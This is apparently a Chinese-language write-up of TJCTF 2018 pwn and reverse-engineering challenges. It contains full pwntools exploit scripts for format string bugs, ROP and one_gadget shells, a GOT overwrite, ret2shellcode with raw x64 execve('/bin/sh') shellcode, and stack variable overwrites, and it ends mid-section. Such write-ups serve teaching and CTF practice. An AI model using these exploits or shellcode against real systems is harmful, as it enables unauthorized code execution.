@@ -1,0 +1,1250 @@
+# TJCTF 2018 Pwn_Re专题全解析
+
+阅读量 **396248**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-08-16 14:30:06
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t01c6f13be09a1a1aee.jpg)
+
+TJCTF2018，面向高中生的比赛，前天结束，题目不算难，AK了RE&&PWN，不过最后一个PWN做的时候有些意思，放在最开始。
+
+## 0x01 Super Secure Secrets
+
+(可能有点非预期)  
+题目没给libc文件  
+先看保护：  
+  
+No PIE  
+第一反应是利用ret2_dl_runtime_resolve  
+首先看到：  
+main:
+
+    
+    
+    int __cdecl main(int argc, const char **argv, const char **envp)
+    {
+      lets_not_be_friends(*(_QWORD *)&argc, argv, envp);
+      secure_service();
+      return 0;
+    }
+    
+
+secure_service函数：
+
+    
+    
+    unsigned __int64 secure_service()
+    {
+      char v1; // [rsp+0h] [rbp-130h]
+      char v2; // [rsp+20h] [rbp-110h]
+      char s; // [rsp+A0h] [rbp-90h]
+      unsigned __int64 v4; // [rsp+128h] [rbp-8h]
+    
+      v4 = __readfsqword(0x28u);
+      puts("Welcome to the Super Secure Service TM");
+      puts("FREE TRIAL VERSION -- Limited to viewing only one message.");
+      puts("Upgrade to PREMIUM for only $999!");
+      putchar(10);
+      print_help(10LL);
+      while ( 1 )
+      {
+        printf("> ");
+        fgets(&s, 128, stdin);
+        switch ( s )
+        {
+          case 104:
+            print_help(&s);
+            continue;
+          case 115:
+            set_message(&v2, &v1);
+            continue;
+          case 117:
+            upgrade();
+            continue;
+          case 118:
+            get_message(&v2, &v1);
+            return __readfsqword(0x28u) ^ v4;
+          case 120:
+            return __readfsqword(0x28u) ^ v4;
+          default:
+            continue;
+        }
+      }
+    }
+    
+
+get_message:
+
+    
+    
+    unsigned __int64 __fastcall get_message(char *a1, const char *a2)
+    {
+      signed int i; // [rsp+1Ch] [rbp-54h]
+      char v4[6]; // [rsp+20h] [rbp-50h]
+      char v5; // [rsp+26h] [rbp-4Ah]
+      char s2; // [rsp+30h] [rbp-40h]
+      char s; // [rsp+40h] [rbp-30h]
+      unsigned __int64 v8; // [rsp+68h] [rbp-8h]
+    
+      v8 = __readfsqword(0x28u);
+      puts("Message Password:");
+      do
+        fgets(&s, 32, stdin);
+      while ( strcmp(a2, &s) );
+      puts("Secret Message:");
+      puts("====================");
+      printf(a1, &s, a2);
+      puts("====================");
+      for ( i = 0; i <= 5; ++i )
+        v4[i] = byte_401238[rand() % 62];
+      v5 = 0;
+      puts("As a free trial user, please complete the following captcha for our monitoring purposes.");
+      printf("Captcha: %sn", v4);
+      fgets(&s2, 7, stdin);
+      if ( !strcmp(v4, &s2) )
+      {
+        puts("Thank you for your cooperation...");
+      }
+      else
+      {
+        memset(a1, 0, 0x80uLL);
+        puts("Incorrect captcha, your message was removed from our database.");
+      }
+      return __readfsqword(0x28u) ^ v8;
+    }
+    
+
+get_message依然存在格式化字符串漏洞  
+a1可控  
+不过复用有些问题，首先考虑复用
+
+###  复用get_message
+
+get_message后直接退出(因为读取一次信息)  
+且upgrade函数没有作用(无法升级功能)  
+这样我们只能获取一次地址，这样我们只能获取地址，无法在获取的同时确定需要修改的目标地址以及需要修改目标地址成什么数据  
+所以首先解决程序复用问题，当我们进入get_message  
+我们能确定的是ebp位置存放了secure_service的栈帧底部  
+我们无法确定将其修改成什么  
+ **不过我们可以使用$hhn修改secure_service的ebp最后一位来使其适当变小来盲打返回地址：**  
+看到secure_service和main返回方式：
+
+    
+    
+    leave
+    retn
+    
+
+首先我们确定获取两个地址：栈地址和libc地址  
+栈地址获取get_message的ebp即可  
+对于libc地址，调试过程可以发现：  
+  
+相对get_message特定某处永远是fgets+0xad的地址  
+(这里说一下非预期  
+中间因为有ebp的盲打，继续ret2_dl_runtime_resolve感觉有些麻烦  
+上面Online Banking，这题可以让我们拿到shell  
+然后因为题目同一域名，猜测是同一服务器  
+拿到shell后去readelf服务器的libc.so.6(或其他方法)即可获得libc的文件版本  
+所以这里采用ret2libc)  
+所以我们使用%17$16llx%20$16llx%20$hhn获取ebp&&fgets_AD_addr地址，并改变secure_servic的ebp的最后一位，来控制main返回时的esp，这时候esp会指向原ebp&0xfffffffffffffff0+0x20(因为之前输出了0x20字节(为了对其内存))  
+这时候整体栈帧迁移向低一些的地址：  
+看到
+
+    
+    
+    .text:0000000000400DA0 var_130= byte ptr -130h
+    .text:0000000000400DA0 var_110= byte ptr -110h
+    .text:0000000000400DA0 s= byte ptr -90h
+    .text:0000000000400DA0 var_8= qword ptr -8
+    
+
+esp会落到s(即我们输入的命令字符)  
+如果我们把这一片布置成secure_servic的某处地址，为了保证程序不会崩溃（维护ebp），选择跳转到secure_servic的mov
+rbp,rsp处：
+
+    
+    
+    .text:0000000000400DA1 mov     rbp, rsp
+    
+
+(不过有时候原ebp末位太大或者太小会无法成功)  
+当程序返回到main时，rsp便会指向s中的一个位置，ret后便会返回到secure_servic处，完成复用
+
+###  ROP
+
+下面整个栈地址都可以通过调试得出  
+即可再次通过get_message的格式化字符串修改get_message返回地址  
+首先想到的是system(“/bin/sh”)  
+所以我们需要布置栈段,构造rop链调取system：
+
+    
+    
+    get_message返回地址处:pop_edi_ret->bin_sh_addr->system_addr
+    
+    
+    
+    ROPgadget --binary ./super_secret  --ropchain
+    
+    
+    
+    Gadgets information
+    ============================================================
+    0x0000000000400e2f : adc eax, dword ptr [rax] ; jmp rax
+    0x0000000000400759 : adc eax, dword ptr [rcx] ; add byte ptr [rax], al ; add rsp, 8 ; ret
+    0x0000000000400dc7 : add al, bpl ; ret 0xfff9
+    0x0000000000400dc8 : add al, ch ; ret 0xfff9
+    0x0000000000400f9f : add bl, dh ; ret
+    0x0000000000400f9d : add byte ptr [rax], al ; add bl, dh ; ret
+    0x0000000000400f9b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
+    ......
+    
+
+为了简化利用过程，我们只需要修改返回地址  
+bin_sh_addr+system_addr何以用secure_service的set_message来布置，因为password的位置恰好在get_message返回地址的正下方  
+Exploit:（这里我利用了第一次的password来获取/bin/sh字符串，没有使用libc中的/bin/sh，因为最初没找到libc版本，只能在服务器readelf获取system偏移）（同时注意输入正确验证码，否则get_message会执行memset(a1,
+0, 0x80uLL);）
+
+    
+    
+    from pwn import *
+    #context.log_level = 'debug'
+    p=process("./super_secret")
+    p.recvuntil("> ")
+    payload1=p64(0x000400DA1)*15
+    p.sendline(payload1)
+    p.recvuntil("> ")
+    p.sendline("s")
+    p.recvuntil("Password:n")
+    p.sendline("/bin/shx00")
+    p.recvuntil("Message:n")
+    p.sendline("%17$16llx%20$16llx%20$hhn")
+    p.recvuntil("> ")
+    p.sendline("v")
+    p.recvuntil("Password:n")
+    p.sendline("/bin/shx00")
+    p.recvuntil("====================n")
+    key=p.recvuntil("n")
+    fgets_AD_addr=int(key[0:17],16)
+    fgets_addr=fgets_AD_addr-0xad
+    system_addr=fgets_addr-0x6dad0+0x000000000045390
+    ebp_addr=int(key[17:33],16)
+    ebp_new=(ebp_addr&0xffffffffffffff00)+0x20+0x10
+    bin_sh_addr=ebp_addr-0x130
+    pop_edi_ret=0x0000000000400f93 
+    p.recvuntil("Captcha: ")
+    ch=p.recv()[:6]
+    p.sendline(ch)
+    payload=p64(bin_sh_addr)+p64(system_addr)
+    p.recv()
+    p.sendline("s")
+    p.recv()
+    p.sendline(payload)
+    p.recv()
+    retn_addr=ebp_new-0x138
+    print hex(retn_addr)
+    payload3="%3987c%28$hn%41c"+p64(retn_addr)
+    p.sendline(payload3)
+    print p.recvuntil("> ")
+    p.sendline("v")
+    p.recv()
+    p.sendline(payload)
+    p.recvuntil("Captcha: ")
+    ch=p.recv()[:6]
+    p.sendline(ch)
+    p.interactive()
+    
+
+在本地成功打到shell  
+不过远程总是报错：
+
+    
+    
+    timeout: the monitored command dumped core
+    
+
+猜测是服务器端运行时环境变量的缘故  
+最后选择使用one_gadget获取执行execve(“/bin/sh”)的地址来打到shell
+
+    
+    
+    $ one_gadget  ./libc.so.6
+    
+    
+    
+    0x4f2c5    execve("/bin/sh", rsp+0x40, environ)
+    constraints:
+      rcx == NULL
+    
+    0x4f322    execve("/bin/sh", rsp+0x40, environ)
+    constraints:
+      [rsp+0x40] == NULL
+    
+    0x10a38c    execve("/bin/sh", rsp+0x70, environ)
+    constraints:
+      [rsp+0x70] == NULL
+    
+
+修改pop rdi;ret后的system地址为execve(“/bin/sh”)的地址  
+最终远程打到shell:
+
+    
+    
+    from pwn import *
+    
+    p=remote("problem1.tjctf.org",8009)
+    p.recvuntil("> ")
+    payload1=p64(0x000400DA1)*15
+    p.sendline(payload1)
+    p.recvuntil("> ")
+    p.sendline("s")
+    p.recvuntil("Password:n")
+    p.sendline("/bin/shx00")
+    p.recvuntil("Message:n")
+    p.sendline("%17$16llx%20$16llx%20$hhn")
+    p.recvuntil("> ")
+    p.sendline("v")
+    p.recvuntil("Password:n")
+    p.sendline("/bin/shx00")
+    p.recvuntil("====================n")
+    key=p.recvuntil("n")
+    fgets_AD_addr=int(key[0:17],16)
+    fgets_addr=fgets_AD_addr-0xad
+    execve_addr=fgets_addr-0x7eb20+0x0000000010a38c
+    ebp_addr=int(key[17:33],16)
+    ebp_new=(ebp_addr&0xffffffffffffff00)+0x20+0x10
+    bin_sh_addr=ebp_addr-0x130
+    pop_edi_ret=0x0000000000400f93 
+    p.recvuntil("Captcha: ")
+    ch=p.recv()[:6]
+    p.sendline(ch)
+    payload=p64(bin_sh_addr)+p64(execve_addr)
+    p.recv()
+    p.sendline("s")
+    p.recv()
+    p.sendline(payload)
+    p.recv()
+    retn_addr=ebp_new-0x138
+    hex(retn_addr)
+    payload3="%3987c%28$hn%41c"+p64(retn_addr)
+    p.sendline(payload3)
+    p.recvuntil("> ")
+    p.sendline("v")
+    p.recv()
+    p.sendline(payload)
+    p.recvuntil("Captcha: ")
+    ch=p.recv()[:6]
+    p.sendline(ch)
+    p.interactive()
+    
+
+**另一种解法：**
+
+> Because printf utilizes malloc and free, we can trigger a free call just by
+> doing ‘%65537c’.  
+>  And we can overwrite __free_hook to listen to free calls, therefore, invoke
+> our own function.
+    
+    
+    from pwn import *
+    
+    # context.log_level = 'debug'
+    context.binary = './super_secure'
+    
+    sh = process('./super_secure')
+    # sh = remote('problem1.tjctf.org', 8009)
+    
+    
+    def send_payload(payload, p=False):
+      sh.sendlineafter('> ', 's')
+      sh.sendlineafter(':n', '123')
+      sh.sendlineafter(':n', payload)
+      sh.sendlineafter('> ', 'v')
+      sh.sendlineafter(':n', '123')
+      if p:
+        sh.recvuntil('====================n')
+        out = sh.recvuntil('====================n').split('n')[0]
+        print out
+      sh.sendline('')
+      if p:
+        return out
+    
+    memset_got = 0x00602050
+    strcmp_got = 0x00602070
+    
+    secure_service = 0x00400da0
+    
+    # stage 1: make it loop
+    
+    stage1 = '%{}x'.format(secure_service)
+    stage1 += '%28$n  '
+    stage1 += p64(memset_got)
+    
+    send_payload(stage1)
+    
+    # stage 2: leak libc
+    
+    # for i in range(1, 50):
+    #   send_payload('%{}$llx'.format(i), True)
+    
+    output = int(send_payload('%1$llx', True), 16)
+    system_c = output - 3789731
+    lib_c_base = system_c - 0x0004f440
+    pwn_adrr = lib_c_base + 0x10a38c
+    free_hook = lib_c_base + 0x001ed8e8 + 0x200000
+    
+    print hex(lib_c_base)
+    print hex(pwn_adrr)
+    print hex(free_hook)
+    
+    pause()
+    
+    # stage 3: pwn
+    goal = hex(pwn_adrr+0x10000000000000000)[3:]
+    for i in range(len(goal), 4, -4):
+      stage3 = '%{}x'.format(int(goal[i-4:i], 16))
+      l = len(stage3)
+      stage3 += '%28$n'.ljust(16-l)
+      stage3 += p64(free_hook+(16-i)/2)
+      send_payload(stage3, True)
+    
+    send_payload('%65537c')
+    
+    sh.interactive()
+    
+
+这里后期也是调用了execve(“/bin/sh”),不过前面利用printf内部的特点来hijack-hook-function：
+
+    
+    
+    https://github.com/Naetw/CTF-pwn-tips#hijack-hook-function
+    
+
+## 0x02 Secure Secrets
+
+简单的格式化字符串&&GOT表修改  
+查看程序保护：  
+  
+ **发现No PIE**  
+看到get_message函数：  
+关键点：
+
+    
+    
+    printf("n");
+    printf(a1);
+    printf("n");
+    
+
+且a1可控，显然这里有格式化字符串漏洞  
+同时看到函数get_secret：
+
+    
+    
+      v1 = fopen("flag.txt", "r");
+      if ( v1 )
+      {
+        __isoc99_fscanf(v1, "%s", &v2);
+        printf("Here is your secret: %sn", &v2);
+      }
+      else
+      {
+        puts("Secret could not be accessed.");
+      }
+    
+
+在get_message函数中：
+
+    
+    
+      printf("n");
+      printf(a1);
+      printf("n");
+      puts("Tada! Hope you liked our service!");
+    
+
+且在main中：
+
+    
+    
+    get_message(&v4, &s);
+    exit(0);
+    
+
+所以我们修改got中puts、printf或者exit地址(但修改printf老是失效，不知道什么原因)来跳转到get_secret  
+ **利用格式化漏洞修改GOT表中特定函数地址为get_secret函数地址：**  
+Exploit：
+
+    
+    
+    from pwn import *
+    
+    e=ELF("./secret")
+    p=remote('problem1.tjctf.org', 8008)
+    secret_addr=e.symbols["get_secret"]
+    puts_got_addr=e.got["puts"]
+    payload=p32(puts_got_addr)
+    payload+=p32(puts_got_addr+2)
+    payload+='%34571c'
+    payload+='%35$n'
+    payload+='%33009c'
+    payload+='%36$n'
+    payload+='n'
+    p.recvuntil("> ")
+    p.sendline("a")
+    p.recvuntil("> ")
+    p.sendline(payload)
+    p.recvuntil("> ")
+    p.sendline("a")
+    p.interactive()
+    
+
+## 0x03 Online Banking
+
+简单的ret2shellcode，利用bss段执行shellcode  
+首先查看程序保护：  
+  
+没有任何保护  
+查看程序，发现：
+
+    
+    
+    fgets(name, 33, stdin);
+    
+
+读入的name可以容下shellcode(有时候长度不够，可以考虑name紧接着的地方可不可控，使几段数据可以连接组成shellcode)  
+name位于：
+
+    
+    
+    .bss:00000000006010A0 name            db 21h dup(?)           ; DATA XREF: main+78↑o
+    
+
+查看.bss段权限：  
+  
+  
+可以执行  
+x64下shellcode：
+
+    
+    
+    "x6ax3b"                                    # pushq    $0x3b
+    "x58"                                        # pop    %rax
+    "x99"                                        # cltd
+    "x48xbbx2fx2fx62x69x6ex2fx73x68"               # mov    $0x68732f6e69622f2f, %rbx
+    "x48xc1xebx08"                            # shr    $0x8, %rbx
+    "x53"                                        # push   %rbx
+    "x48x89xe7"                                # mov    %rsp, %rdi
+    "x52"                                        # push    %rdx
+    "x57"                                        # push   %rdi
+    "x48x89xe6"                                # mov    %rsp, %rsi
+    "xb0x3b"                                    # mov    $0x3b, %al
+    "x0fx05"                                    # syscall
+    
+
+exploit：
+
+    
+    
+    from pwn import *
+    
+    payload="a"*9+p64(0x00000000deadbeef)+p64(0x0000000006010a0)
+    payload2="x6ax3bx58x99x48xbbx2fx2fx62x69x6ex2fx73x68x48xc1xebx08x53x48x89xe7x52x57x48x89xe6xb0x3bx0fx05"
+    p=remote("problem1.tjctf.org",8005)
+    print p.recvuntil("Name: ")
+    p.sendline(payload2)
+    print p.recvuntil("PIN: ")
+    p.sendline("aaaa")
+    print p.recvuntil("quit")
+    p.sendline("d")
+    print p.recvuntil("PIN: ")
+    p.sendline(payload)
+    p.interactive()
+    
+
+## 0x04 Bricked Binary
+
+hint：
+
+    
+    
+    Earlier, I input my flag to this image and received 22c15d5f23238a8fff8d299f8e5a1c62 as the output. Unfortunately, later on I broke the program and also managed to lose my flag. Can you find it for me?
+    
+
+提示：I broke the program  
+看到程序这里：
+
+    
+    
+    mov     [ebp+src], offset unk_8048684
+    mov     eax, [ebx+4]
+    add     eax, 4
+    mov     eax, [eax]
+    sub     esp, 8
+    push    [ebp+src]       ; src
+    push    eax             ; dest
+    call    _strcpy
+    add     esp, 10h
+    mov     eax, [ebx+4]
+    add     eax, 4
+    mov     eax, [eax]
+    sub     esp, 0Ch
+    push    eax             ; s
+    call    hash
+    
+
+而unk_8048684处为”db 0”  
+显然这个”call _strcpy”有问题  
+看到hash函数对命令行参数进行了处理：
+
+    
+    
+    int __cdecl hash(char *s)
+    {
+      int result; // eax
+      int i; // [esp+4h] [ebp-14h]
+      signed int v3; // [esp+8h] [ebp-10h]
+    
+      v3 = strlen(s);
+      for ( i = 0; ; ++i )
+      {
+        result = i;
+        if ( i >= v3 )
+          break;
+        s[v3 - 1 - i] = LOBYTE(u[i]) ^ LOBYTE(v[s[v3 - 1 - i]]);
+      }
+      return result;
+    }
+    
+
+利用程序定义好的u和v两个数组进行一种简单的异或加密  
+密文输出： **22c15d5f23238a8fff8d299f8e5a1c62**  
+首先可以直接提取u和v数组后逆算法：
+
+    
+    
+    ans="22c15d5f23238a8fff8d299f8e5a1c62"
+    flag=""
+    k="81000000CD0000000A00000073000000B30000003B00000032000000B60000006E0000007C0000003100000057000000D1000000C5000000150000003A00000092000000B4000000E200000051000000AE000000420000005500000041000000E100000070000000300000001A0000000200000084000000A2000000E7000000B90000004D0000003C000000A30000000B000000B20000002B000000AB000000460000007E000000240000009C000000850000006F000000E4000000C40000005F000000CE0000004F0000000100000082000000FD0000006C000000AC000000DF000000640000000C000000A1000000E30000009E0000005D000000BB000000FE000000D30000002900000096000000C7000000F3000000FC00000065000000AA0000008A0000005A000000F5000000B700000038000000A50000008D000000D80000008E0000003900000007000000DE000000D50000001100000080000000E50000008900000035000000FF000000DD000000A60000001F000000230000000D000000C000000093000000C8000000670000001700000068000000180000008B00000062000000CC0000009D000000DA0000005600000066000000C60000007F000000E600000086000000E000000022000000C20000000F0000001B000000F60000002D0000006300000033000000910000007100000059000000EB000000A9000000D200000083000000BF0000003D0000006A00000008000000F9000000A70000004000000000000000E800000052000000BE000000FA0000004E0000002600000076000000CF000000540000007D0000001900000006000000F8000000D00000007400000028000000050000003F000000A00000001E000000C10000004500000049000000D4000000AF000000030000009B0000002F000000EE000000270000009A000000A400000097000000480000004A000000D90000003700000047000000AD00000044000000CA000000EF000000D7000000B8000000DB000000F00000009F0000005800000053000000EA0000002A0000007A00000036000000870000008C000000B50000007200000088000000B100000009000000F1000000160000003E0000006900000014000000EC00000025000000BC000000ED000000BA000000BD0000002C000000C9000000DC00000013000000F4000000750000001D0000004B000000C300000034000000100000006B00000077000000980000005E0000005C000000990000008F0000001200000094000000CB0000002E0000004C000000E900000020000000F70000004300000060000000FB0000006D0000001C000000780000000E000000B0000000D600000050000000790000007B0000006100000095000000A8000000040000005B000000F20000009000000021000000"
+    key="040000000700000005000000080000000C0000000A00000006000000020000000D00000001000000000000000E000000090000000B000000030000000F000000CA000000DE000000140000009400000029000000E9000000440000004B00000084000000E4000000D70000003A000000620000003F000000EF000000B70000007A0000009F000000F7000000FD0000005600000052000000B9000000C70000003E0000005C000000C4000000D5000000E1000000C900000093000000760000004800000088000000BF00000067000000A4000000EA000000D000000017000000CE00000098000000BB000000AC0000001C000000AB000000C100000026000000A600000083000000DD00000010000000960000009D00000080000000190000009C000000AF00000091000000D8000000AD000000A5000000B400000071000000DA000000F90000008C00000077000000A800000075000000A7000000550000003B000000FE000000E8000000ED0000006100000024000000950000005400000063000000AE0000004A000000DF0000003100000036000000F30000008D0000001D00000059000000470000005D00000074000000C00000006C0000002200000069000000BE000000EE0000008A00000034000000D30000001500000070000000BC000000F000000097000000F4000000E6000000D40000004C000000F100000079000000B800000073000000DC00000035000000D2000000CB0000005F0000008E000000C80000003800000032000000FB000000FA0000007B000000CD0000005A00000090000000A1000000A3000000580000008B000000B0000000D9000000B30000007D000000EB000000D100000078000000FC0000008600000050000000BD00000039000000C20000005E000000BA00000030000000230000004300000028000000CF0000006E000000E500000051000000DB000000B5000000A9000000E700000020000000210000006A000000B2000000F600000042000000E3000000E00000004F00000027000000810000002B0000007E000000A2000000F500000089000000D6000000FF0000001200000046000000400000009A000000600000007F0000002D000000130000001F00000087000000CC0000001A00000092000000110000002C000000B10000005700000085000000C6000000B600000066000000820000006B000000C30000001B000000160000006F00000037000000E2000000530000001E0000006D0000004E00000045000000640000002F00000072000000C5000000650000007C000000250000004100000049000000F80000003C0000002E000000AA000000330000008F0000004D000000680000009E0000005B0000003D000000EC00000099000000A00000009B00000018000000F20000002A00"
+    for i in range(len(ans)/2):
+        key1=int(ans[32-(i+1)*2:32-(i+1)*2+2],16)
+        key2=int(key[i*8:i*8+2],16)
+        key3=key1^key2
+        key4=hex(key3)[2:]
+        if len(key4)==1:
+            key4="0"+key4
+        key4=key4.upper()
+        key6=k.find(key4)/8
+        if key6<30:
+            key6=k.rfind(key4)/8
+        flag+=chr(key6)
+    print flag[::-1]
+    
+
+或者：  
+可以看到加密过程中最后的位置不受前面影响，也就是可以根据密文从后向前逐位爆破出flag  
+首先patch掉程序，直接将”call
+_strcpy”nop掉即可(不然strcpy会使我们在命令行输入的任何字符串变为x00)，调用patch好的程序爆破：
+
+    
+    
+    from pwn import *
+    ans="22c15d5f23238a8fff8d299f8e5a1c62"
+    flag=""
+    for i in range(16):
+     for j in range(30,127):
+      p=process(["./re_4",chr(j)+flag])
+      s=p.recv()[:2]
+      if s==ans[32-(i+1)*2:32-(i+1)*2+2]:
+        flag=chr(j)+flag
+        p.close()
+        break
+      p.close()
+    print flag
+    
+
+## 0x05 Math Whiz
+
+最基本的变量覆盖  
+看到关键(获取flag)处：
+
+    
+    
+    .text:565C9A08                 cmp     [ebp+var_C], 0
+    .text:565C9A0C                 jz      short loc_565C9A3F
+    .text:565C9A0E                 sub     esp, 8
+    .text:565C9A11                 lea     eax, [ebp+var_30]
+    .text:565C9A14                 push    eax
+    .text:565C9A15                 lea     eax, (aSuccessfullyRe - 565CAFA8h)[ebx] ; "Successfully registered '%s' as an admi"...
+    .text:565C9A1B                 push    eax             ; format
+    .text:565C9A1C                 call    _printf
+    .text:565C9A21                 add     esp, 10h
+    .text:565C9A24                 sub     esp, 8
+    .text:565C9A27                 lea     eax, (aRedacted - 565CAFA8h)[ebx] ; "-----REDACTED-----"
+    .text:565C9A2D                 push    eax
+    .text:565C9A2E                 lea     eax, (aHereIsYourFlag - 565CAFA8h)[ebx] ; "Here is your flag: %sn"
+    .text:565C9A34                 push    eax             ; format
+    .text:565C9A35                 call    _printf
+    .text:565C9A3A                 add     esp, 10h
+    .text:565C9A3D                 jmp     short loc_565C9A55
+    .text:565C9A3F ; ---------------------------------------------------------------------------    .text:565C9A3F
+    .text:565C9A3F loc_565C9A3F:                           ; CODE XREF: main+1A0↑j
+    .text:565C9A3F                 sub     esp, 8
+    .text:565C9A42                 lea     eax, [ebp+var_30]
+    .text:565C9A45                 push    eax
+    .text:565C9A46                 lea     eax, (aSuccessfullyRe_0 - 565CAFA8h)[ebx] ; "Successfully registered '%s' as an user"...
+    .text:565C9A4C                 push    eax             ; format
+    .text:565C9A4D                 call    _printf
+    .text:565C9A52                 add     esp, 10h
+    .text:565C9A55
+    .text:565C9A55 loc_565C9A55:                           ; CODE XREF: main+1D1↑j
+    .text:565C9A55                 mov     eax, 0
+    .text:565C9A5A                 lea     esp, [ebp-8]
+    .text:565C9A5D                 pop     ecx
+    .text:565C9A5E                 pop     ebx
+    .text:565C9A5F                 pop     ebp
+    .text:565C9A60                 lea     esp, [ecx-4]
+    .text:565C9A63                 retn
+    
+
+两种register方式  
+我们需要ebp+var_C不为0即可  
+这里我们的输入流调用了input  
+查看input：
+
+    
+    
+    fgets(s, (signed int)(a2 * 16.0), stdin);
+    
+
+而：
+
+    
+    
+    printf("Recovery Pin: ");
+    input(v30, 4.0);
+    
+
+可以向v30读入64字节：  
+其中：
+
+    
+    
+    char v30[4]; // [esp+60h] [ebp-44h]
+    ebp+var_C：
+    int v43; // [esp+98h] [ebp-Ch]
+    
+
+可以利用v30覆盖掉ebp+var_C从而获取flag：
+
+    
+    
+    from pwn import *
+    
+    p=remote("problem1.tjctf.org",8001)
+    p.recvuntil("Full Name: ")
+    p.sendline("Kirin")
+    p.recvuntil("Username: ")
+    p.sendline("Kirin")
+    p.recvuntil("Password: ")
+    p.sendline("kirin")
+    p.recvuntil("Recovery Pin: ")
+    p.sendline("A"*64)
+    p.recvuntil("Email: ")
+    p.sendline("Kirin")
+    p.recvuntil("Address: ")
+    p.sendline("Kirin")
+    p.recvuntil("Biography: ")
+    p.sendline("Kirin")
+    p.interactive()
+    
+
+## 0x06 Tilted Troop
+
+同样是很简单的变量覆盖  
+看到在fight函数中可以输出flag：
+
+    
+    
+    int __fastcall fight(__int64 a1, int a2)
+    {
+      unsigned int v3; // [rsp+18h] [rbp-8h]
+      int i; // [rsp+1Ch] [rbp-4h]
+    
+      v3 = 0;
+      for ( i = 0; i < a2; ++i )
+        v3 += *(char *)(i + a1);
+      if ( v3 != 400 )
+        return printf("Your team had %d strength, but you needed exactly %d!n", v3, 400LL);
+      puts("Wow! Your team is strong! Here, take this flag:");
+      return puts("[REDACTED]");
+    }
+    
+
+我们需要让a1指针指向的长为a2的char型数组之和为400  
+main函数：
+
+    
+    
+    int __cdecl main(int argc, const char **argv, const char **envp)
+    {
+      __gid_t rgid; // ST04_4
+      char *v4; // rbx
+      char *dest; // ST08_8
+      __int64 v7[8]; // [rsp+10h] [rbp-70h]
+      char *v8; // [rsp+50h] [rbp-30h]
+      int v9; // [rsp+58h] [rbp-28h]
+      unsigned __int64 v10; // [rsp+68h] [rbp-18h]
+    
+      v10 = __readfsqword(0x28u);
+      rgid = getegid();
+      setresgid(rgid, rgid, rgid);
+      setbuf(stdout, 0LL);
+      v9 = 0;
+      v8 = (char *)malloc(0x20uLL);
+      puts("Commands:n A <name> - Add a team membern F - Fight the monstern Q - Quit");
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            gets(&input, 255LL, stdin);
+            if ( input != 65 )
+              break;
+            if ( v9 <= 8 )
+            {
+              v4 = &v8[v9];
+              *v4 = rand() % 10;
+              dest = (char *)malloc(0x100uLL);
+              strcpy(dest, src);
+              v7[v9++] = (__int64)dest;
+            }
+            else
+            {
+              puts("Your team is too large!");
+            }
+          }
+          if ( input != 70 )
+            break;
+          fight((__int64)v8, v9);
+        }
+        if ( input == 81 )
+          break;
+        puts("Try again");
+      }
+      puts("Thanks for playing!");
+      return 0;
+    }
+    
+
+关注传入fight的v8  
+看到：
+
+    
+    
+     __int64 v7[8]; // [rsp+10h] [rbp-70h]
+      char *v8; // [rsp+50h] [rbp-30h]
+    
+
+以及：
+
+    
+    
+           if ( v9 <= 8 )
+            {
+              v4 = &v8[v9];
+              *v4 = rand() % 10;
+              dest = (char *)malloc(0x100uLL);
+              strcpy(dest, src);
+              v7[v9++] = (__int64)dest;
+            }
+    
+
+当v9为8，v7[v9]恰好可以覆盖指针v8  
+看到：
+
+    
+    
+    dest = (char *)malloc(0x100uLL);
+    strcpy(dest, src);
+    v7[v9++] = (__int64)dest;
+    
+
+最终覆盖掉v8的是dest指针  
+dest指向的字符串即为src指向的字符串  
+src在bss段，且位于input后方
+
+    
+    
+    .bss:000055F52322D040 input           db ?                    ; DATA XREF: main+80↑o
+    .bss:000055F52322D040                                         ; main+91↑r ...
+    .bss:000055F52322D041                 align 2
+    .bss:000055F52322D042 ; char src[254]
+    
+
+所以我们最后一次(第九次)输入的命令为”A dddd”(且之前没有输入长于4字节的teamname，4*ord(“d”)=100)：
+
+    
+    
+    from pwn import *
+    
+    p=remote("problem1.tjctf.org",8002)
+    p.recvuntil("Quit")
+    for i in range(8):
+        p.sendline("A")
+    p.sendline("A dddd")
+    p.sendline("F")
+    p.interactive()
+    
+
+## 0x07 Future Canary Lab
+
+简单的伪随机&&变量覆盖  
+main函数中：
+
+    
+    
+    v4 = time(0);
+    srand(v4);
+    interview(0);
+    
+
+显然seed可预测  
+interview：
+
+    
+    
+    void __cdecl __noreturn interview(int a1)
+    {
+      int v1[10]; // [esp+8h] [ebp-A0h]
+      char s; // [esp+30h] [ebp-78h]
+      int v3[10]; // [esp+70h] [ebp-38h]
+      int j; // [esp+98h] [ebp-10h]
+      int i; // [esp+9Ch] [ebp-Ch]
+    
+      for ( i = 0; i <= 9; ++i )
+      {
+        v1[i] = rand();
+        v3[i] = v1[i];
+      }
+      puts("Welcome to the Future Canary Lab!");
+      puts("What is your name?");
+      gets(&s);
+      for ( j = 0; j <= 9; ++j )
+      {
+        if ( v3[j] != v1[j] )
+        {
+          puts("Alas, it would appear you lack the time travel powers we desire.");
+          exit(0);
+        }
+      }
+      if ( a1 - i + j == 0xDEADBEEF )
+      {
+        puts("You are the one. This must be the choice of Stacks Gate!");
+        printf("Here is your flag: %sn", "-----REDACTED-----");
+      }
+      else
+      {
+        puts("Begone, FBI Spy!");
+      }
+      exit(0);
+    }
+    
+
+获得flag需要：
+
+    
+    
+    a1 - i + j == 0xDEADBEEF
+    其中a1=0
+    
+
+看到：
+
+    
+    
+    gets(&s);
+    
+
+且在gets前i就已在程序确定(j在后来的for ( j = 0; j <= 9; ++j )确定)：  
+但覆盖”i”就会覆盖掉 for ( i = 0; i <= 9; ++i )循环中生成的10个随机数，而在for ( j = 0; j <= 9; ++j
+)中对这10个随机数进行了检测，并且用于检测的v1数组无法被覆盖，不过time(0)生成的seed可预测，先在特定时间数内生成一组随机数，在预计的时间运行程序来覆盖v3即可：
+
+    
+    
+    #include<stdio.h>
+    #include<time.h>
+    #include<stdlib.h>
+    int main(){
+    int a=time(0);
+    printf("%dn",a);
+    a=1533965040;
+    srand(a);
+    printf("%dn",a);
+    for(int i=0;i<=9;i++)
+      printf("%d,",rand());
+    printf("n");
+    }
+    
+    
+    
+    from pwn import *
+    import time
+    
